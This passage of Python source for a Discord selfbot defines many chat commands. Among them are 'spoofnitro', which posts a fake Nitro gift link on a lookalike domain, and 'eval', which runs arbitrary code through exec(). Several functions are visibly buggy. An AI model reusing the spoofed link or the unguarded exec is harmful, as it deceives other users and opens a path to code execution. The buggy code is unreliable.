                embed.add_field(name='__üëæ Commands__', value=cmds)
                await embed_or_codeblock(ctx, embed)


                            
        except Exception:
            pass

    @React.command(usage="changelog", description="Shows the latest changelog")
    async def changelog(ctx):
        try:
            changeloglist = requests.get("https://reactselfbot.pro/api/changelog.txt").text

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='React Selfbot Changelog',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.add_field(name='__üìÉ Changelog__', value=f'{changeloglist}')
            await embed_or_codeblock(ctx, embed)


                            
        except Exception:
            pass

    @React.command(usage="shelp", description="Shows all commands in the console")
    async def shelp(ctx):
        try:
            features = open('features.txt', 'r')
            print(features)
        except Exception:
            pass
    
    def rgb_to_hex(rgb):
        return '%02x%02x%02x' % rgb
    
    def color_fade(fade_ticks, *colors: list, repeat=False):
        if colors == ():
            colors = [[255, 0, 0], [255, 255, 0], [0, 128, 0], [0, 0, 255]]
        else:
            colors = list(colors)

        if repeat:
            colors.append(colors[0])

        active_RGB = colors[0].copy()
        active_RGB_list = []
        for color_pos, color in enumerate(colors[:-1]):
            for i in range(fade_ticks):
                active_RGB_list.append(active_RGB.copy())
                for pos, RGB in enumerate(color):
                    if color_pos == len(colors) - 1:
                        color_pos = 0
                        RGB2 = colors[color_pos+1][pos]
                    else:
                        RGB2 = colors[color_pos+1][pos]
                    distance = RGB2 - RGB
                    active_RGB[pos] += int(distance / fade_ticks)

        return active_RGB_list
    
    def hex_to_RGB(hex_value):
        hex_value = hex_value.replace("#", "")
        hex_list = []
        hex_list.extend("0123456789ABCDEF")

        all_combo = [f"{x}{y}" for x in hex_list for y in hex_list]

        RGB = []
        for pos in range(len(hex_value)):
            if pos % 2 == 1:
                hex_combo = hex_value[pos] + hex_value[pos-1]
                RGB.append(all_combo.index(str(hex_combo)))

        return RGB
    
    def RGB_to_hex(RGB):
        for pos in range(len(RGB)):
            RGB[pos] = str(RGB[pos])

        hex_list = []
        hex_list.extend("0123456789ABCDEF")

        all_combo = [f"{x}{y}" for x in hex_list for y in hex_list]

        for pos, color in enumerate(RGB.copy()):
            RGB[pos] = all_combo[int(color)]

        return f"0x{''.join(RGB)}"


    
    @React.command(usage="rainbowrole <Role>", description="Fades the role color")
    async def rainbowrole(ctx, role: discord.Role):
        try:
            while True:
                for color in color_fade(50):
                    await role.edit(reason = None, color = int(RGB_to_hex(color), 16))
            await ctx.send(role.name)
        except Exception:
            pass

    @React.command(usage="addfavorite <Command>", description="Add a command to the favorites")
    async def addfavorite(ctx, command):            
        try:
            with open('FavoriteCommands.txt', 'a+') as f:
                try:
                    f.write(command = "\n")
                except:
                    pass
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Favorite Commands',timestamp=embed_timestamp())
            embed.add_field(name=f'Added Command', value=f"{command}", inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="delfavorite <Command>", description="Delete a command from the favorites")
    async def delfavorite(ctx, command):
        cmd = React.get_command(f"{command}")
        with open('FavoriteCommands.txt', 'w') as f:
            try:
                lines = f.read().split('\n')
                for line in lines:
                    if line != command:
                        f.write(line)
            except:
                pass
            f.close()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Favorite Commands',timestamp=embed_timestamp())
        embed.add_field(name=f'Deleted Command', value=f"{command}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="disablecommand <Command>", description="Disables a selfbot command")
    async def disablecommand(ctx, command):            
        try:
            cmd = React.get_command(f"{command}")
            cmd.update(enabled = False)
            with open('DisabledCommands.txt', 'a+') as f:
                try:
                    f.write(command + "\n")
                except:
                    pass
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Disable Command',timestamp=embed_timestamp())
            embed.add_field(name=f'Command Disabled', value=f"{command}", inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="enablecommand <Command>", description="Enables a selfbot command")
    async def enablecommand(ctx, command):
        cmd = React.get_command(f"{command}")
        cmd.update(enabled = True)
        with open('DisabledCommands.txt', 'w') as f:
            try:
                lines = f.read().split('\n')
                for line in lines:
                    if line.strip("\n") != command:
                        f.write(line)
            except:
                pass
            f.close()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Enable Command',timestamp=embed_timestamp())
        embed.add_field(name=f'Command Enabled', value=f"{command}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="ignorenitro <Channel>", description="Ignores Nitro codes form a channel")
    async def ignorenitro(ctx, channel: discord.TextChannel):
        ignored_nitro_channels.append(channel)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ignore Nitro',timestamp=embed_timestamp())
        embed.add_field(name=f'Channel', value=f"{channel.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="stopignorenitro <Channel>", description="Stop ignoring Nitro codes form a channel")
    async def stopignorenitro(ctx, channel: discord.TextChannel):
        ignored_nitro_channels.remove(channel)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Stop Ignore Nitro',timestamp=embed_timestamp())
        embed.add_field(name=f'Channel', value=f"{channel.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="ignoreuser <User>", description="Ignores messages from an user")
    async def ignoreuser(ctx, user: discord.User):
        ignored_users.append(user)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ignore User',timestamp=embed_timestamp())
        embed.add_field(name=f'User', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="stopignoreuser <User>", description="Stops ignoring messages from an user")
    async def stopignoreuser(ctx, user: discord.User):
        ignored_users.remove(user)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ignore User',timestamp=embed_timestamp())
        embed.add_field(name=f'Removed User', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="stopignoreallusers", description="Stops ignoring messages from all users")
    async def stopignoreallusers(ctx):
        ignored_users.clear()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ignore User', description='Stopped ignoring all users', timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="semimute <User>", description="Delete every message a user sends")
    async def semimute(ctx, user: discord.User):
        semi_muted.append(user)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Semi Mute', timestamp=embed_timestamp())
        embed.add_field(name=f'User', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="unsemimute <User>", description="Stop semi-mute for user")
    async def unsemimute(ctx, user: discord.User):
        semi_muted.remove(user)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Semi Mute',timestamp=embed_timestamp())
        embed.add_field(name=f'Removed User', value=f"{user.mention}", inline=True)
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="clearsemimute", description="Clear semi-mute list")
    async def clearsemimute(ctx):
        semi_muted.clear()
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Semi Mute', description= "Removed all users from the semi-mute list",timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="slowmode <Seconds>", description="Set channel slowmode")
    async def slowmode(ctx, seconds: int):
        await ctx.channel.edit(slowmode_delay = seconds)
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Slowmode', description=f'Slowmode delay set to {delay} seconds', timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="yt2mp4 <YouTube URL>", description="Download a YouTube Video")
    async def yt2mp4(ctx, youtube_url: str):
        with youtube_dl.YoutubeDL({}) as ydl:
            ydl.download([f'{youtube_url}'])
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Youtube 2 mp4', description=f'Downloaded YouTube video in the selfbot folder.', timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="spoofnitro", description="Sends a Nitro gift link which doesn't embed but looks real ")
    async def spoofnitro(ctx):
        await ctx.send("discŒørd.gift/" + "".join((random.choice(string.ascii_letters + string.digits) for i in range(16))))
        
    @React.command(usage="truthordare [Truth/Dare]", description="Random Truth or Dare")
    async def truthordare(ctx, truth_or_dare: str='truth'):
        try:
            if truth_or_dare.lower() not in ['truth', 'dare']:
                truth_or_dare = 'truth' 
            resp = requests.get("https://raw.githubusercontent.com/sylhare/Truth-or-Dare/master/src/output.json").json()
            available_values = len(resp)
            def go_deep() -> int:
                random_value = random.randint(0, available_values)
                if resp[random_value]['type'].lower() == truth_or_dare:
                    return random_value
                else:
                    return go_deep()

            value_id = go_deep()

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Truth or Dare',timestamp=embed_timestamp())
            embed.add_field(name=f'__üé® Type__', value=f"{resp[value_id]['type']}", inline=False)
            embed.add_field(name=f'__ü•Ω Summary__', value=f"{resp[value_id]['summary']}", inline=False)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="empty", description="Sends an empty message")
    async def empty(ctx):
        await ctx.send(chr(173))

    @React.command(usage="remoteexecute <Channel> <Command> [Arguments]", description="Execute a command in another channel")
    async def remoteexecute(ctx, target_channel: discord.channel.TextChannel, command: str, *, args=None):
        try:
            current_ctx = ctx
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Remote Execute',timestamp=embed_timestamp())
            embed.add_field(name=f'__üëæ Command__', value=f"{command}", inline=False)   
            embed.add_field(name=f'__ü•Ω Arguments__', value=f"{args}", inline=False)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(current_ctx, embed)
            fake_ctx = ctx
            fake_ctx.channel = target_channel
            try:
                fake_ctx.args = list(args)
            except:
                pass
            cmd = React.get_command(f"{command}")
            try:
                await fake_ctx.invoke(cmd, args)
            except:
                await fake_ctx.invoke(cmd)

        except Exception:
            pass

    # @React.command()
    # async def llo(ctx):
    #     members = ctx.channel.members
    #     for member in members:
    #         print(member.name)

    @contextlib.contextmanager
    def stdoutIO(stdout=None):
        try:
            old = sys.stdout
            if stdout is None:
                stdout = StringIO()
            sys.stdout = stdout
            yield stdout
            sys.stdout = old
        except Exception:
            pass

    @React.command(usage="eval <Code>", description="Evaluate Python code")
    async def eval(ctx, *, code):
        try:
            with stdoutIO() as s:
                exec(code)
            await ctx.send(f'''```\n{s.getvalue()}```''')
        except Exception:
            pass
        
    @React.command(usage="shrug", description="Sends a shrug text emoticon")
    async def shrug(ctx):
        await ctx.send("¬Ø\_(„ÉÑ)_/¬Ø")
        
    @React.command(usage="tableflip", description="Sends a tableflip text emoticon")
    async def tableflip(ctx):
        await ctx.send("(‚ïØ¬∞‚ñ°¬∞Ôºâ‚ïØÔ∏µ ‚îª‚îÅ‚îª")
        
    @React.command(usage="unflip", description="Sends a table unflip text emoticon")
    async def unflip(ctx):
        await ctx.send("‚î¨‚îÄ‚î¨ „Éé( „Çú-„Çú„Éé)")
        
    @React.command(usage="randomemoji", description="Sends a random emoji")
    async def randomemoji(ctx):
        try:
            await ctx.send(random.choice(React.emojis))
        except:
            await ctx.send(random.choice())
        
    @React.command(usage="calculator", description="Opens calculator [Windows only]")
    async def calculator(ctx):
        os.system('calc')
        
    @React.command(usage="folder", description="Open React folder [Windows only]")
    async def folder(ctx):
        os.system(f'explorer.exe {os.getcwd()}')
        
    @React.command(usage="winexplorer", description="Opens Windows Explorer [Windows only]")
    async def winexplorer(ctx):
        os.system('explorer')
        
    @React.command(usage="repeatcmd", description="Repeats last command")
    async def repeatcmd(ctx):
        try:
            await ctx.send(f"{command_history[len(command_history) - 1]}")
        except Exception:
            pass
        
    @React.command(usage="channels [Server ID]", description="Show server channels (including hidden ones)")
    async def channels(ctx, server_id: int=None):
        try:             
            if server_id is None:
                server = discord.utils.get(ctx.bot.guilds, id=ctx.guild.id)
            else: 
                server = discord.utils.get(ctx.bot.guilds, id=server_id)
                
            channels = server.channels
                
            le_channels = []   
            
            for channel in channels:
                le_channels.append(channel)
            try:                                        
                if True:
